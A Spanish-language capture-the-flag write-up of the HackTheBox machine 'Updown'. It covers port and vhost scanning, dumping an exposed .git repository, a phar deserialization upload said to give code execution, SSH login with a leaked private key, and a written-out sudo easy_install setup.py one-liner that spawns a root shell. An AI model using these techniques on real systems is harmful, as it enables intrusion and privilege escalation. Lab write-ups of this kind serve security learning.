# Updown - HackTheBox

**Fecha de resolución:** 20 de septiembre de 2026

Máquina Linux, IP 10.129.59.254. El nombre viene del propio sitio corriendo en el puerto 80, una app llamada "Is my website up".

## Reconocimiento

Escaneo completo de puertos:

```
nmap 10.129.59.254 -Pn -n -vvv -sV -p- -oN scan.txt
```

Dos puertos abiertos: 22 (OpenSSH) y 80 (Apache). Sin nada explotable a simple vista en ssh, la enumeración se centró en el puerto 80.

## Enumeración web

Fuzzing de vhosts:

```
gobuster vhost -u http://updown.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
gobuster vhost -u http://siteisup.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

`siteisup.htb` respondió con la aplicación real. Fuzzing de directorios sobre esa vhost:

```
index.php           (Status: 200) [Size: 1131]
dev                 (Status: 301) [Size: 312] [--> http://10.129.59.254/dev/]
```

La aplicación deja subir un archivo con una lista de webs y comprueba cuáles están caídas. El changelog publicado en el propio sitio dice esto:

```
Beta version

1- Check a bunch of websites.

-- ToDo:

1- Multithreading for a faster version :D.
2- Remove the upload option.
3- New admin panel.
```

El punto 2 del ToDo señala directamente la función de subida como el punto débil.

## Código fuente vía /dev

El directorio `/dev` es una copia de desarrollo del sitio con el `.git` accesible. Descargué el repositorio completo con git-dumper:

```
cd /opt
sudo git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
python3 -m venv venv
./venv/bin/pip3 install -r requirements.txt
./venv/bin/python3 git_dumper.py
```

Con el repositorio ya en local, revisé el historial de commits para entender cómo valida el formulario de subida:

```
git log -p
git log -p | grep upload
```

Esto, junto con `admin.php` y el resto del código fuente, deja ver que el checker no filtra correctamente las extensiones del archivo subido.

## Explotación

La ruta de ataque es una RCE vía el wrapper `phar://`: el checker acepta un archivo que en realidad es un phar con un objeto serializado, y al procesarlo dispara la deserialización. Fui iterando el payload hasta dar con uno funcional:

```
test.phar, reverse.phar, command.phar, intento2.phar, test2.phar, try.phar
```

Con un listener en escucha capturé ejecución como `www-data` en el host de `dev`.

## Acceso como developer

Entre los archivos del repositorio dumpeado había una clave privada SSH. La usé directamente para autenticarme:

```
chmod 600 sshkey
ssh -i sshkey developer@siteisup.htb
```

Acceso confirmado como `developer`. Flag de usuario capturada en su home.

## Escalada a root

Con `sudo -l` como `developer` aparece esto:

```
User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

`easy_install` instala un paquete ejecutando su `setup.py`, así que basta con crear uno malicioso y pasárselo:

```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo easy_install $TF
```

`sudo` no baja privilegios durante la instalación, así que el `setup.py` se ejecuta como root. Shell de root obtenida y flag capturada.

---

GitHub: [github.com/germanvegaa](https://github.com/germanvegaa)
TryHackMe: [tryhackme.com/p/G3RM4N](https://tryhackme.com/p/G3RM4N)
HackTheBox: [app.hackthebox.com/public/users/3990132](https://app.hackthebox.com/public/users/3990132)
